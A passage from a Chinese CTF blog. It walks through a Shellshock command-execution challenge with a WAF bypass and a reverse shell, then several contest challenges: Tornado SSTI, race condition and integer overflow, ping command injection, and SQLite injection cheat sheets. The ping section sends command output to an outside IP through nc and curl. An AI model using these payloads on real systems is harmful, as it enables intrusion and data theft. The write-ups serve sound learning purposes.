$val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        foreach($black_list as $b) &#123;</span><br><span class="line">            if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123;</span><br><span class="line">                fuck(&quot;$b detected! exit now.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line">function execute($cmd, $shell=&apos;bash&apos;) &#123;</span><br><span class="line">    system(sprintf(&apos;%s -c %s&apos;, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_SERVER as $key =&gt; $val) &#123;</span><br><span class="line">    if(substr($key, 0, 5) === &apos;HTTP_&apos;) &#123;</span><br><span class="line">        putenv(&quot;$key=$val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;func&apos;])) &#123;</span><br><span class="line">    $page = $_GET[&apos;func&apos;];</span><br><span class="line">    if(strstr($page, &apos;..&apos;) !== false) &#123;</span><br><span class="line">        $page = &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($page &amp;&amp; strlen($page) &gt; 0) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        include(&quot;$page.php&quot;);</span><br><span class="line">    &#125; catch (Exception $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>审计index.php的时候，发现了一个黑名单，过滤了/flag以及(){ :; };，这个时候还并不知道有何作用，接着查看untar的源码，发现网页只是把我们上传的文件名进行解压，并没什么卵用。接下来的源码没啥利用价值。<br>根据飘零师傅的wp，飘零师傅通过观察到了env以及putenv联想到了之前的一个cve，具体的分析如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.freebuf.com/articles/system/45390.html</span><br></pre></td></tr></table></figure></p>
<p>接着飘零师傅推荐这篇生成exp的文章:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/20/3.png" alt=""><br>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; :; &#125;; echo Hacked&quot; -q -O -  http://127.0.0.1/shock.php</span><br></pre></td></tr></table></figure></p>
<p>接着可以对比一下之前的源码，发现出现漏洞的源码十分相似，我们可以尝试一下payload的实用性，不过之前在waf中我们看到过滤了payload的一部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$black_list = [</span><br><span class="line">    &apos;\/flag&apos;, &apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p>
<p>我们可以通过在:;之间加空格来绕过，所以尝试的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; echo This is a test&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/20/4.png" alt=""><br>发现成功执行了命令，那接着我们可以尝试读取一下/etc/passwd<br><img src="/images/20/5.png" alt=""><br>可以发现flag文件夹在根目录下，尝试读取一下。<br><img src="/images/20/6.png" alt=""><br>突然想起来，/flag被过滤了，这里我们用通配符绕过，但是并没有任何回显，我们用第四个功能ls看啥情况。<br><img src="/images/20/7.png" alt=""><br>发现我们没权限读取这个文件，需要root权限，但是下面flag-reader.c可以读取，我们尝试读一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;syscall.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">	char buff[4096], rnd[16], val[16];</span><br><span class="line">	if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123;</span><br><span class="line">		write(1, &quot;Not enough random\n&quot;, 18);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	setuid(1337);</span><br><span class="line">	seteuid(1337);</span><br><span class="line">	alarm(1);</span><br><span class="line">	write(1, &amp;rnd, sizeof(rnd));</span><br><span class="line">	read(0, &amp;val, sizeof(val));</span><br><span class="line"></span><br><span class="line">	if(memcmp(rnd, val, sizeof(rnd)) == 0) &#123;</span><br><span class="line">		int fd = open(argv[1], O_RDONLY);</span><br><span class="line">		if(fd &gt; 0) &#123;</span><br><span class="line">			int s = read(fd, buff, 1024);</span><br><span class="line">			if(s &gt; 0) &#123;</span><br><span class="line">				write(1, buff, s);</span><br><span class="line">			&#125;</span><br><span class="line">			close(fd);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			write(1, &quot;Can not open file\n&quot;, 18);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		write(1, &quot;Wrong response\n&quot;, 16);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>看不太懂，套用一叶飘零师傅的话就是，这个命令可以1秒之内把他输出的再输入回去，就可以打出文件内容。<br>运行这个c，再把这个c输出在1s内再输回去，但是纯靠这样的交互，速度极慢，所以容易想到，要不要拿个shell？接着我们可以利用bash弹shell到我们的服务器上:<br><img src="/images/20/8.png" alt=""><br>有了shell，现在就是如何读取flag的问题了，这里借鉴了一叶飘零师傅的思路，通过找到可写入文件的目录，利用了linux下的重定向，将输出写到某个文件中，再自动输入即可，这样即可达到目的。通过ls的功能我们可以看到tmp目录可以写入，所以参考的payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/flllag &lt; /var/tmp/flllag</span><br></pre></td></tr></table></figure></p>
<p>接着读取这个文件就行了。<br>PS:记得删除自己所留下的文件，要不然可能导致题目没办法做了。不过在tmp目录下一堆别人留下的flag文件，随便读一个就行了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/01/结合CVE的一道命令执行弹shell的题目/" data-id="cjv4r4ryw001lmcvjywcfufgb" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/命令执行/">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-近期比赛学习总结" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/10/15/近期比赛学习总结/" class="article-date">
  <time class="post-time" datetime="2018-10-15T10:22:35.000Z" itemprop="datePublished">
    <span class="post-month">10月</span><br>
    <span class="post-day">15</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/15/近期比赛学习总结/">近期比赛学习总结</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>最近又陷入了自闭自闭又自闭的环节，先是pico高中生比赛被吊打，接着又是inctf被吊打，周末又被护网杯题目弄自闭，对此只能说自己技术太菜，总结一下最近新学到的知识点吧（由于比赛打完之后环境关了，所以只能结合大师傅们的wp进行复现）。  </p>
<h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h2><p>这是护网杯的签到题，说句实话一开始打就知道这一次比赛又是凶多吉少，点进去发现有三个文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Orz.txt </span><br><span class="line">render()</span><br><span class="line"></span><br><span class="line">hint.txt </span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line"></span><br><span class="line">flag.txt </span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure></p>
<p>赛后梳理起来，提示真是太明显了，当然这是马后炮了，render()就说明了这里用了渲染，就可能存在ssti注入，果不其然在报错页面发现了msg这个参数，通过利用msg=4测试发现返回了4，也就是说明可以通过ssti注入得到数据。<br>接着是url构成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename=Orz.txt&amp;signature=9e3bb6483951e58b6095f949d572dd9a</span><br></pre></td></tr></table></figure></p>
<p>hint.txt提示签名的生成方式，以及flag.txt提示了/flllllllllllg也就是说我们只要读取这个文件夹就能得到flag，那现在问题就是通过ssti注入得到cookie_secret，通过测试发现了一个问题就是ssti注入过滤了很多东西，只能读取变量。<br>既然题目提示了easy tornado，那么我们可以查询源码找突破口，这部分直接搜索cookie发现了在handler.settings存放了cookie_secret，直接通过msg=读取出cookie_secret再通过hint中提示的签名方式生成/fllllllllg的签名读取出flag。<br>这道题目有两个点坑，导致我没做出来….一个就是报错界面了，之后一定要主要一些报错界面或者一些不太重要的界面，既然存在就有他的作用，接着第二个点就是没认真阅读tornado的源码，如果存在ssti注入那模板一定得认真阅读，特别是关于敏感信息的一些文件。  </p>
<h2 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h2><p>这是一道关于条件竞争以及整数溢出的题目，一开始只有20块只能买4个辣条，通过开多线程跑出来发现自己花了20元买了7个辣条，接着在兑换的时候利用整数溢出漏洞买足够辣条通过兑换flag得到flag。  </p>
<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争漏洞是一种服务器端的漏洞，是由于开发者设计应用程序并发处理时操作逻辑不合理而造成。当应用面临高并发的请求时未能同步好所有请求，导致请求与请求之间产生等待时出现逻辑缺陷。该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。<br>在CTF中很容易出现这种漏洞，特别是在文件操作以及金额同步的情形下，例如上面这道题目，在购买辣条时，后端操作应该是先把辣条数+1，然后再扣除费用，当我们开多线程发送多条购买辣条的请求时，服务端同时处理多条请求，同步处理不当，很有可能导致一包辣条的钱购买了多包的情况，或者是在金额即将归零时购买了辣条导致金额为负值。<br>或者是在上传文件时，服务器先将文件储存再通过检测后缀名将黑名单的文件进行删除，这里可以在文件删除之前访问文件，从而执行文件中的命令，例如可以在文件中写入file_put_contents()再生成一个shell，或者是将文件名改成白名单的文件。</p>
<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>准确来说这并不是属于web方面的内容，但是web杂的很，结合啥的漏洞都可能出现，像之前接触到的sprintf()格式化漏洞，结合mysql就出了一道盲注题目，还有pwn方面的结合web就有了沙箱逃逸这个专题…..话不多说…<br>一般来说，整形变量有int，short，long等，但是很多程序员在使用typedef定义新整形变量时会随缘定义，这就导致一些程序在跨平台的兼容性很差，所以业界有了一个整形变量的标准。如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef signed char             int8_t;   </span><br><span class="line">typedef short int               int16_t;  </span><br><span class="line">typedef int                     int32_t;  </span><br><span class="line">typedef long int                int64_t;    </span><br><span class="line">typedef long long int           int64_t;  </span><br><span class="line">typedef unsigned char           uint8_t;  </span><br><span class="line">typedef unsigned short int      uint16_t;  </span><br><span class="line">typedef unsigned int            uint32_t;  </span><br><span class="line">typedef unsigned long int       uint64_t;  </span><br><span class="line">typedef unsigned long long int  uint64_t;</span><br></pre></td></tr></table></figure></p>
<p>而在c中，这些整数储存占用字节如下:<br><img src="/images/19/1.png" alt=""><br>溢出的方式根据数据类型有两种不同的类型：<br>第一种上界溢出，比如short int这个类型，它储存的数据从-32678~32677，如果我们操作32677，让其加1，那它储存的数据块最后一位储存符号位的字节就被溢出的数据给更改了，也就是说直接变为了最小的-32678，如果根据算式来看就是<strong>32677+1=-32678</strong>，这种带符号位在web网页中不常见，常见的是unsigned类型，再比如说unsigned short int数据储存的范围是0~65535，要是对65535操作加1，也就变成了0，通过算式说明就是:<strong>65535+1=0</strong>，也就是说我如果在网页中购买大量商品，后台数据处理出现整数溢出，那我们就能花1件的钱来购买65537件商品。<br>第二种为下界溢出，就类似上界溢出的逆运算，利用点和上界溢出一样，就粗略带过了…</p>
<h2 id="Fancy-alive-monitoring"><a href="#Fancy-alive-monitoring" class="headerlink" title="Fancy-alive-monitoring"></a>Fancy-alive-monitoring</h2><p>直接上源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Monitoring Tool&lt;/title&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">	function check()&#123;</span><br><span class="line">		ip = document.getElementById(&quot;ip&quot;).value;</span><br><span class="line">		chk = ip.match(/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$/);</span><br><span class="line">		if (!chk) &#123;</span><br><span class="line">			alert(&quot;Wrong IP format.&quot;);</span><br><span class="line">			return false;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			document.getElementById(&quot;monitor&quot;).submit();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;Monitoring Tool ver 0.1&lt;/h1&gt;</span><br><span class="line">	&lt;form id=&quot;monitor&quot; action=&quot;index.php&quot; method=&quot;post&quot; onsubmit=&quot;return false;&quot;&gt;</span><br><span class="line">	&lt;p&gt; Input IP address of the target host</span><br><span class="line">	&lt;input id=&quot;ip&quot; name=&quot;ip&quot; type=&quot;text&quot;&gt;</span><br><span class="line">	&lt;/p&gt;</span><br><span class="line">	&lt;input type=&quot;button&quot; value=&quot;Go!&quot; onclick=&quot;check()&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$ip = $_POST[&quot;ip&quot;];</span><br><span class="line">if ($ip) &#123;</span><br><span class="line">	// super fancy regex check!</span><br><span class="line">	if (preg_match(&apos;/^(([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5]).)&#123;3&#125;([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])/&apos;,$ip)) &#123;</span><br><span class="line">		exec(&apos;ping -c 1 &apos;.$ip, $cmd_result);</span><br><span class="line">		foreach($cmd_result as $str)&#123;</span><br><span class="line">			if (strpos($str, &apos;100% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is NOT alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125; else if (strpos($str, &apos;, 0% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;Wrong IP Format.&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;a href=&quot;index.txt&quot;&gt;index.php source code&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>题目主要是考源码审计以及命令执行，题目在客户端和服务端分别对ip进行了检测，第一次在客户端的检测如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chk = ip.match(/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$/);</span><br></pre></td></tr></table></figure></p>
<p>这里明显只能匹配xxx.xxx.xxx.xxx格式的ip，但是可以很简单的通过burp抓包绕过，接着看服务端的检测:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/^(([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5]).)&#123;3&#125;([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])/&apos;,$ip</span><br></pre></td></tr></table></figure></p>
<p>这里并没有使用$限制输入ip的结束，也就是说我们只要满足前面的ip匹配即可，接着使用命令分隔符就能执行我们命令了，但是源码中并没有回显，只有这一部分回显:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (strpos($str, &apos;100% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is NOT alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125; else if (strpos($str, &apos;, 0% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br></pre></td></tr></table></figure></p>
<p>那也就是说，我们得通过其他方式来获取回显的信息。这里提供两种方式。</p>
<h3 id="netcat监听"><a href="#netcat监听" class="headerlink" title="netcat监听"></a>netcat监听</h3><p>第一种方式就是在我们的服务器上开启一个监听端口，然后在目标机上通过nc链接，把执行的命令返回给我们的服务器。<br>首先我们开启一个端口，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 2333</span><br></pre></td></tr></table></figure></p>
<p>接着使用目标机执行ls命令然后发给我们的服务器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;ls | nc 66.42.72.66 2333</span><br></pre></td></tr></table></figure></p>
<p>我们的服务器就收到了回显：<br><img src="/images/19/2.png" alt=""><br>接着通过读取flag文件就好了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;cat the-secret-1755-flag.txt | nc 66.42.72.66 2333</span><br></pre></td></tr></table></figure></p>
<p>得到flag：picoCTF{n3v3r_trust_a_b0x_36d4a875}</p>
<h3 id="带flag访问接收器"><a href="#带flag访问接收器" class="headerlink" title="带flag访问接收器"></a>带flag访问接收器</h3><p>第二种方式是通过带flag直接访问我们的服务器，把执行命令返回的内容通过赋值到一个变量然后访问我们的服务器，例如使用curl 或者是 wget命令。例如我们可以构造这样一个payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;curl http://66.42.72.66/`ls`</span><br></pre></td></tr></table></figure></p>
<p>接着我们查看日志，发现:<br><img src="/images/19/3.png" alt=""><br>我们只得到了一个文件，那就是index.php，结合使用netcat监听方法发现这是第一个文件，这是因为在/的后面只能带一个参数，所以在不清楚有多少文件的情况下，我们是没办法用倒叙或者一个一个查的，因此我们可以使用base64，把结果进行编码构成一个参数进行访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;curl http://66.42.72.66/`ls | base64`</span><br></pre></td></tr></table></figure></p>
<p>我们接收到了base64后的所有文件名:<br><img src="/images/19/4.png" alt=""><br>接着解码再读flag就行了。这也可以使用？带变量进行访问具体可以自己尝试。  </p>
<h2 id="A-Simple-Question"><a href="#A-Simple-Question" class="headerlink" title="A Simple Question"></a>A Simple Question</h2><p>这是一道考sqlite注入的题目，sql注入中这一种倒是不太常见，但是和mysql有着类似的特点。<br>一进去就发现源码泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include &quot;config.php&quot;;</span><br><span class="line">  ini_set(&apos;error_reporting&apos;, E_ALL);</span><br><span class="line">  ini_set(&apos;display_errors&apos;, &apos;On&apos;);</span><br><span class="line"></span><br><span class="line">  $answer = $_POST[&quot;answer&quot;];</span><br><span class="line">  $debug = $_POST[&quot;debug&quot;];</span><br><span class="line">  $query = &quot;SELECT * FROM answers WHERE answer=&apos;$answer&apos;&quot;;</span><br><span class="line">  echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">  echo &quot;SQL query: &quot;, htmlspecialchars($query), &quot;\n&quot;;</span><br><span class="line">  echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  $con = new SQLite3($database_file);</span><br><span class="line">  $result = $con-&gt;query($query);</span><br><span class="line"></span><br><span class="line">  $row = $result-&gt;fetchArray();</span><br><span class="line">  if($answer == $CANARY)  &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Perfect!&lt;/h1&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  elseif ($row) &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;You are so close.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Wrong.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>简单审计发现，数据库会查询我们输入的答案，如果返回结果，那么会输出you are so close，但是如果搜索无果，那么就只会提示wrong，题目的主要思路就是通过注入的方式判断answer是什么，再通过输入answer得到flag。</p>
<h3 id="sqlite注入"><a href="#sqlite注入" class="headerlink" title="sqlite注入"></a>sqlite注入</h3><p>sqlite注入和mysql注入差不多，就是语法存在一些差异。<br>这里以字符型为例子:  </p>
<ul>
<li>查询行数：’ order by x – -  </li>
<li>查询回显位： ‘ union select 1,2,3,4,5….. – -</li>
<li>查询表名： ‘ union select 1,group_concat(tbl_name),3,4,5… from sqlite_master where type=’table’ and tbl_name not like ‘sqlite_%’ – -</li>
<li>查询列名： ‘ union select 1,group_concat(sql),3,4,5… from sqlite_master where type!=’meta’ and sql not null and name not like ‘sqlite_%’ and table=’表名’ – -</li>
<li>查询字符串： ‘ union select 1,列名,3,4,5… from 表名 – -</li>
</ul>
<p>接下来就是sqlite的布尔型注入:</p>
<ul>
<li>查询表的数量：’ and ( (select count(tbl_name) from sqlite_master where type=’table’ and tbl_name not like ‘sqlite_%’ ) = x) – -</li>
<li>查询表名长度： ‘ and ((select length(tbl_name) from sqlite_master where type=’table’ and tbl_name not like ‘sqlite_%’ limit 0 offset 1) = x) – -</li>
<li>查询表名：’ and ( (SELECT hex(substr(tbl_name,’猜解的字符位置’,1)) FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ limit 1 offset 0) = hex(‘a’) ) – -</li>
<li>查询列名： ‘ and ((select hex(substr(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,’(‘)%2b1)),instr((substr(sql,instr(sql,’(‘)%2b1)),’<code>&#39;)),&quot;TEXT&quot;,&#39;&#39;),&quot;INTEGER&quot;,&#39;&#39;),&quot;AUTOINCREMENT&quot;,&#39;&#39;),&quot;PRIMARY KEY&quot;,&#39;&#39;),&quot;UNIQUE&quot;,&#39;&#39;),&quot;NUMERIC&quot;,&#39;&#39;),&quot;REAL&quot;,&#39;&#39;),&quot;BLOB&quot;,&#39;&#39;),&quot;NOT NULL&quot;,&#39;&#39;),&quot;,&quot;,&#39;~~&#39;),&quot;</code>“,””),’猜解的字符位置’,1)) FROM sqlite_master WHERE type!=’meta’ AND sql NOT NULL AND name NOT LIKE ‘sqlite_%’ and name=’表名’) = hex(‘a’) ) – -</li>
<li>查询字符串： ‘ and ( (select hex(substr(列名),1,1)) from users limit 1 offset 0) = hex(‘a’) ) – -</li>
</ul>
<p>这些操作也不用死记住，理解查询的语法就差不多了，复杂的到时写脚本直接套就行了。</p>
<h2 id="Old-School-SQL"><a href="#Old-School-SQL" class="headerlink" title="Old School SQL"></a>Old School SQL</h2><p>这道sql注入的题目把我想到的绕过以及我没想到的绕过都过滤了。源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &quot;./config.php&quot;;</span><br><span class="line">include &quot;./flag.php&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$black_list = &quot;/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\&apos;|&quot;;</span><br><span class="line">$black_list .= &quot;=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;;</span><br><span class="line">if(preg_match($black_list, $_GET[&apos;user&apos;])) exit(&quot;:P&quot;); </span><br><span class="line">if(preg_match($black_list, $_GET[&apos;pw&apos;])) exit(&quot;:P&quot;); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query=&quot;select user from chal where user=&apos;$_GET[user]&apos; and pw=&apos;$_GET[pw]&apos;&quot;; 